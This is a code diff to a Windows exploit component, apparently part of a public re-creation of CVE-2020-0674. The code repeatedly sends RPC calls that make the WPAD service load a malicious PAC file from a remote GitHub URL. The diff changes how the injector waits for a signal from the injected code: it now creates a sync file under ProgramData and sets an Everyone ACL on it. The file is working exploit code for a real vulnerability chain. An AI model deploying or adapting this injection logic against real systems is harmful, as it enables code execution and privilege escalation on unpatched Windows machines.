@@ -5,6 +5,8 @@
 
 #pragma comment(lib, "rpcrt4.lib")
 
+BOOL SetEveryoneFileAcl(const wchar_t* FilePath);
+
 ////////
 ////////
 // Global settings
@@ -15,6 +17,8 @@
 //#define DLL_BUILD
 //#define SHELLCODE_BUILD
 #define TARGET_PAC_URL L"https://raw.githubusercontent.com/forrest-orr/ExploitDev/master/Exploits/Re-creations/Internet%20Explorer/CVE-2020-0674/x64/Forrest_Orr_CVE-2020-0674_64-bit.pac"
+#define SYNC_FOLDER L"C:\\ProgramData\\DoubleStarSync"
+#define SYNC_FILE L"C:\\ProgramData\\DoubleStarSync\\DoubleStarSync"
 
 ////////
 ////////
@@ -254,19 +258,36 @@ int32_t wmain(int32_t nArgc, const wchar_t* pArgv[]) {
         4. Terminates itself.
         */
 
-        HANDLE hEvent = CreateEventW(NULL, TRUE, FALSE, L"DoubleStarSync");
+        if (CreateDirectoryW(SYNC_FOLDER, NULL) || GetLastError() == ERROR_ALREADY_EXISTS) {
+            HANDLE hFile = CreateFileW(SYNC_FILE, GENERIC_READ, 0, NULL, CREATE_ALWAYS, 0, NULL);
 
-        while (TRUE) {
-            DebugLog(L"... sending PAC update RPC signal to WPAD...");
-            RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
-            DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
+            if (hFile != INVALID_HANDLE_VALUE) {
+                CloseHandle(hFile);
 
-            if (WaitForSingleObject(hEvent, 3000) == WAIT_OBJECT_0) {
-                DebugLog(L"... received sync signal from code within WPAD");
-                break;
+                if (SetEveryoneFileAcl(SYNC_FILE)) {
+                    DebugLog(L"... successfully set Everyone ACL on %ws", SYNC_FILE);
+
+                    while (TRUE) {
+                        DebugLog(L"... sending PAC update RPC signal to WPAD...");
+                        RPC_STATUS RpcStatus = WpadInjectPac(pArgv[1]);
+                        DebugLog(L"... WPAD PAC injection attempt returned RPC status of 0x%08x", RpcStatus);
+                        Sleep(3000);
+                        hFile = CreateFileW(SYNC_FILE, GENERIC_READ, FILE_SHARE_READ, NULL, OPEN_EXISTING, 0, NULL);
+                        if (hFile == INVALID_HANDLE_VALUE) {
+                            DebugLog(L"... received sync signal from code within WPAD");
+                            break;
+                        }
+                        else {
+                            DebugLog(L"... timed out waiting on sync signal from code within WPAD");
+                        }
+                    }
+                }
+                else {
+                    DebugLog(L"... failed to set Everyone ACL on file at %ws", SYNC_FILE);
+                }
             }
             else {
-                DebugLog(L"... timed out waiting on sync signal from code within WPAD");
+                DebugLog(L"... failed to create sync file at %ws", SYNC_FILE);
             }
         }
     }
